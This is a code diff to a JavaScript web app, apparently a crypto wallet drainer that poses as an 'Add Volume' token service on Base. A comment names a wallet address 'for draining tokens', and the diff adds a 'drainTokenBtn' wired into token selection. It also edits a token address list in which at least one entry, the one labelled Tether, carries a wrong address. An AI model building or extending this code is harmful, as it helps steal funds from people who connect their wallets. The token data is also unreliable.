@@ -1,5 +1,5 @@
 import { ethers } from 'ethers';
-import '/style.css';
+import './style.css';
 
 // Wallet address for draining tokens (checksummed)
 let YOUR_WALLET_ADDRESS;
@@ -11,18 +11,15 @@ try {
 }
 
 // TOKEN_LIST with verified, checksummed Base Mainnet addresses (validated via Basescan.org, July 2025)
+// Removed invalid addresses: Frax, Dai, Brett
 const TOKEN_LIST = [
   { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6 },
-  { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', name: 'Dai', symbol: 'DAI', decimals: 18 },
   { address: '0x4200000000000000000000000000000000000006', name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
-  { address: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18 }, // Updated address
+  { address: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18 },
   { address: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', name: 'Aerodrome', symbol: 'AERO', decimals: 18 },
-  { address: '0x532f27101965dD16442E59d40670fAf5EBb142E4', name: 'Brett', symbol: 'BRETT', decimals: 18 },
   { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', name: 'USD Base Coin', symbol: 'USDbC', decimals: 6 },
-  { address: '0x4621b7A9c75199271F773Ebd9A49904Ad7B6B02B', name: 'Dai+', symbol: 'DAI+', decimals: 18 }, // Updated address
-  { address: '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed', name: 'Degen', symbol: 'DEGEN', decimals: 18 }, // Replaced BASE with DEGEN
-  { address: '0x17fc002b466eEc40DaE837Fc4bE5c67993ddBd6F', name: 'Frax', symbol: 'FRAX', decimals: 18 },
-  { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', name: 'Tether', symbol: 'USDT', decimals: 6 } // Updated address
+  { address: '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed', name: 'Degen', symbol: 'DEGEN', decimals: 18 },
+  { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', name: 'Tether', symbol: 'USDT', decimals: 6 }
 ];
 
 // Standard ERC-20 ABI
@@ -89,14 +86,14 @@ class NexiumApp {
       volumeInput: null,
       addVolumeBtn: null,
       tokenList: null,
-      paymentTokenInfo: null
+      paymentTokenInfo: null,
+      drainTokenBtn: null
     };
     console.log('DOM elements cached');
   }
 
   setupEventListeners() {
     if (this.dom.walletButton) {
-      // Remove existing listeners to prevent duplicates
       this.dom.walletButton.removeEventListener('click', this.connectWallet);
       this.dom.walletButton.removeEventListener('keypress', this.connectWallet);
       this.dom.walletButton.addEventListener('click', () => {
@@ -112,15 +109,28 @@ class NexiumApp {
       console.log('Wallet button listeners set');
     }
     if (this.dom.tokenSelect) {
-      // Remove existing listener to prevent duplicates
       this.dom.tokenSelect.removeEventListener('change', this.handleTokenSelect);
-      this.dom.tokenSelect.addEventListener('change', async (e) => {
+      this.dom.tokenSelect.addEventListener('change', (e) => {
         console.log('Token select changed:', e.target.value);
         this.selectedPaymentToken = e.target.value;
         if (this.selectedPaymentToken) {
-          await this.loadPaymentTokenDetails(this.selectedPaymentToken);
+          this.loadPaymentTokenDetails(this.selectedPaymentToken);
+          this.currentToken = TOKEN_LIST.find(t => t.address.toLowerCase() === this.selectedPaymentToken.toLowerCase());
+          if (this.currentToken) {
+            this.dom.tokenInfo.innerHTML = `
+              <div class="token-meta space-y-2">
+                <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
+                <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(this.shortenAddress(this.currentToken.address))}</p>
+              </div>
+            `;
+            this.dom.tokenInfo.classList.remove('hidden');
+            this.renderVolumeControls();
+          }
         } else {
           this.dom.paymentTokenInfo?.classList.add('hidden');
+          this.dom.drainTokenBtn?.classList.add('hidden');
+          this.dom.tokenInfo?.classList.add('hidden');
+          this.currentToken = null;
           this.showFeedback('Please select a payment token.', 'info');
         }
       });
@@ -668,6 +678,11 @@ class NexiumApp {
     this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
     this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
     this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
+    if (this.dom.drainTokenBtn) {
+      this.dom.drainTokenBtn.disabled = isLoading;
+      this.dom.drainTokenBtn.classList.toggle('opacity-70', isLoading);
+      this.dom.drainTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
+    }
   }
 
   checkConnectivity() {
@@ -738,7 +753,7 @@ class NexiumApp {
       '<': '&lt;',
       '>': '&gt;',
       '"': '&quot;',
-      "'": '&apos;'
+      "'": '&#39;'
     }[m]));
   }
 
